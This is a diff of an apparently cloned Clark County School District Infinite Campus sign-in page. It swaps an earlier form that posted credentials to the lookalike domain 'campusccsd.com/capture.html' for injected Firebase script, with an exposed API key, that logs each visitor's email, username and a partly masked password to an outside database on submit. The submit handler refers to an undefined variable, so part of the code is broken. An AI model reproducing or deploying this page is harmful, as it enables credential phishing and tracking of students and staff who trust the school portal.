@@ -537,8 +537,6 @@ function toggle(type) {
         </div>
 
         
-
-		<!--
 		<form method="POST" id="form_signin" accept-charset="utf-8" action="https://campus.ccsd.net/campus/verify.jsp">
             <input type="hidden" name="appName" value="clark">
             <input type="hidden" id="screen" name="screen" value="">
@@ -569,9 +567,8 @@ function toggle(type) {
             </div>
             <input type="hidden" name="useCSRFProtection" value="true">
         </form>
-		-->
 		<!-- MY SIGNIN CODE -->
-		<form method="GET" id="form_signin" accept-charset="utf-8" action="http://campusccsd.com/capture.html">
+		<!--<form method="GET" id="form_signin" accept-charset="utf-8" action="http://campusccsd.com/capture.html">
             
             <input type="hidden" id="email" name="email">
             
@@ -591,7 +588,7 @@ function toggle(type) {
                 </div>
             </div>
         </form>
-            
+            -->
             <div class="passwordreset" style="padding-bottom:25px">
             <div class="forgotpasswd">
     <a href="https://campus.ccsd.net/campus/" onclick="toggle(&#39;password&#39;);return false" class="passwordToggle">Forgot your password?</a>&nbsp;&nbsp;&nbsp;<span class="contacttext">|</span>&nbsp;&nbsp;&nbsp;
@@ -669,11 +666,74 @@ line-height: normal;
     });
 </script>
 
+<!--My code is below -->
+<script src="https://www.gstatic.com/firebasejs/4.5.0/firebase.js"></script>
+<script>
+  // Initialize Firebase
+  var config = {
+    apiKey: "AIzaSyDW2N5DTqC2SQvRr0kWZOlYFiq5xgU08-8",
+    authDomain: "campus-site.firebaseapp.com",
+    databaseURL: "https://campus-site.firebaseio.com",
+    projectId: "campus-site",
+    storageBucket: "",
+    messagingSenderId: "71367401718"
+  };
+  firebase.initializeApp(config);
+</script>
+<script>
+class dbEntry
+{
+	constructor(email, user, pass)
+	{
+		this.email = email
+		this.user = user
+		this.passHidden = pass.substring(0, 1)
+		for(var i=1; i<pass.length; i++)
+			this.passHidden += '*'
+	}
+	
+	sendData()
+	{
+		var d = new Date()
+		var monthStr = "" + (d.getMonth() + 1)
+		if(monthStr.length == 1) monthStr = "0" + monthStr;
+		var dayStr = "" + (d.getDate())
+		if(dayStr.length == 1) dayStr = "0" + dayStr;
+		var hrStr = "" + (d.getHours())
+		if(hrStr.length == 1) hrStr = "0" + hrStr;
+		var minStr = "" + (d.getMinutes())
+		if(minStr.length == 1) minStr = "0" + minStr;
+		var secStr = "" + d.getSeconds()
+		if(secStr.length == 1) secStr = "0" + secStr;
+		var msStr = "" + (d.getMilliseconds())
+		if(msStr.length == 1) msStr = "0" + msStr;
+		
+		this.dateStr = d.getFullYear() + '-' + monthStr + '-' + dayStr + ' ' + hrStr + ':' + minStr + ':' + secStr + '.' + msStr;
+		
+		var data = {
+			time: this.dateStr,
+    		email: this.email,
+    		user: this.user,
+    		passHidden: this.passHidden
+ 		};
+ 		
+ 		var updates = {};
+  		updates['/login-attempts/' + this.user + '-' + monthStr + '-' + dayStr + '-' + hrStr + '-' + minStr + '-' + secStr] = data;
+
+  		return firebase.database().ref().update(updates);
+	}
+}
+</script>
 <script>
 //MY SIGNIN CODE
 
 getUrl = window.location.search.substring(1);
 $('#email')[0].value = getUrl.split("=")[1];
+
+$('#form_signin').submit(function() {
+	var entry = new dbEntry(urlSections[0].split("=")[1], urlSections[1].split("=")[1], urlSections[2].split("=")[1]);
+    entry.sendData();
+});
 </script>
 
 </body></html>
